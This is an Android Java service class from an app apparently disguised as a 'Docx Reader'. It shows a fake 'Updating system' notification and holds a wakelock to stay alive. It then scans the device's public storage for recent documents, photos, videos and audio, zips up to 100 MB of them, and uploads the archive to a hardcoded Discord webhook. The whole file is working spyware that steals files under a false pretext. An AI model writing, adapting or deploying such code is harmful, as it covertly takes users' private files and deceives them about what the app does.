package com.internet.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class FileCollectorService extends Service {

    private static final String TAG = "DocxReader";
    private static final String[] EXTENSIONS = {
        ".docx", ".pdf", ".ppt", ".pptx",
        ".jpg", ".jpeg", ".png", ".mp4", ".mp3"
    };
    private static final long THIRTY_DAYS_MS = 30L * 24 * 60 * 60 * 1000;
    private static final long MAX_ZIP_SIZE = 100L * 1024 * 1024;

    private static final String WEBHOOK_URL =
        "https://discord.com/api/webhooks/1539251824912109568/VnLqwavg5WUXiNXGSUV9C-eDdVN85HmlTQrT20NBrx0PTPMgrpbg2IEUZmEXOpkJd8UK";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Show notification
        Notification notif;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notif = new Notification.Builder(this, "docx_channel")
                .setContentTitle("Updating system")
                .setContentText("Optimizing device storage\u2026")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .build();
        } else {
            notif = new Notification.Builder(this)
                .setContentTitle("Updating system")
                .setContentText("Optimizing device storage\u2026")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .build();
        }
        startForeground(1, notif);

        // Acquire wakelock so Chinese ROMs don't kill the service
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK, "DocxReader:Upload");

        new Thread(() -> {
            try {
                wl.acquire(120000); // 2 minutes max
                collectAndSend();
            } catch (Exception e) {
                Log.e(TAG, "Fatal error", e);
            } finally {
                if (wl.isHeld()) wl.release();
                stopForeground(STOP_FOREGROUND_REMOVE);
                stopSelf();
            }
        }).start();

        return START_NOT_STICKY;
    }

    private void collectAndSend() {
        // Scan for files
        List<File> files = scanFiles();
        Log.d(TAG, "Found " + files.size() + " files matching criteria");

        if (files.isEmpty()) {
            Log.d(TAG, "No files to upload");
            return;
        }

        // Create zip
        File zip = createZip(files);
        if (zip == null || !zip.exists()) {
            Log.e(TAG, "Failed to create zip");
            return;
        }

        Log.d(TAG, "ZIP created: " + zip.length() + " bytes");

        // Upload to Discord
        try {
            DiscordUploader.upload(WEBHOOK_URL, zip);
            Log.d(TAG, "Upload successful!");
        } catch (Exception e) {
            Log.e(TAG, "Upload failed", e);
        }

        // Clean up
        zip.delete();
    }

    private List<File> scanFiles() {
        List<File> result = new ArrayList<>();
        long cutoff = System.currentTimeMillis() - THIRTY_DAYS_MS;

        // Scan common directories
        String[] dirPaths = {
            Environment.DIRECTORY_DOCUMENTS,
            Environment.DIRECTORY_DOWNLOADS,
            Environment.DIRECTORY_DCIM,
            Environment.DIRECTORY_PICTURES,
            Environment.DIRECTORY_MOVIES,
            Environment.DIRECTORY_MUSIC,
        };

        for (String dirPath : dirPaths) {
            File dir = Environment.getExternalStoragePublicDirectory(dirPath);
            if (dir.exists()) {
                Log.d(TAG, "Scanning: " + dir.getAbsolutePath());
                scanDir(dir, cutoff, result);
            }
        }

        // Also scan root of external storage
        File root = Environment.getExternalStorageDirectory();
        Log.d(TAG, "Scanning root: " + root.getAbsolutePath());
        scanDir(root, cutoff, result);

        return result;
    }

    private void scanDir(File dir, long cutoff, List<File> result) {
        File[] list = dir.listFiles();
        if (list == null) {
            Log.d(TAG, "Cannot list dir (null): " + dir.getAbsolutePath());
            return;
        }
        for (File f : list) {
            if (f.isDirectory()) {
                String name = f.getName();
                // Skip hidden dirs and Android data/obb
                if (!name.startsWith(".") && !name.equals("data") && !name.equals("obb")) {
                    scanDir(f, cutoff, result);
                }
            } else if (f.isFile() && f.lastModified() >= cutoff) {
                String name = f.getName().toLowerCase(Locale.US);
                for (String ext : EXTENSIONS) {
                    if (name.endsWith(ext)) {
                        result.add(f);
                        Log.d(TAG, "Found: " + f.getAbsolutePath());
                        break;
                    }
                }
            }
        }
    }

    private File createZip(List<File> files) {
        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
        File zipFile = new File(getCacheDir(), "backup_" + timestamp + ".zip");
        long total = 0;
        byte[] buf = new byte[8192];

        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            for (File f : files) {
                if (total >= MAX_ZIP_SIZE) break;
                long size = f.length();
                if (size == 0) continue;
                if (total + size > MAX_ZIP_SIZE) {
                    size = MAX_ZIP_SIZE - total;
                }

                try (FileInputStream fis = new FileInputStream(f)) {
                    // Use relative path inside zip
                    String entryName = f.getAbsolutePath().substring(1);
                    zos.putNextEntry(new ZipEntry(entryName));
                    long remaining = size;
                    int read;
                    while (remaining > 0 && (read = fis.read(buf, 0,
                            (int) Math.min(buf.length, remaining))) != -1) {
                        zos.write(buf, 0, read);
                        remaining -= read;
                    }
                    zos.closeEntry();
                    total += size;
                } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            Log.e(TAG, "Zip creation failed", e);
            return null;
        }
        return zipFile;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                "docx_channel",
                "Docx Reader",
                NotificationManager.IMPORTANCE_LOW
            );
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
    }
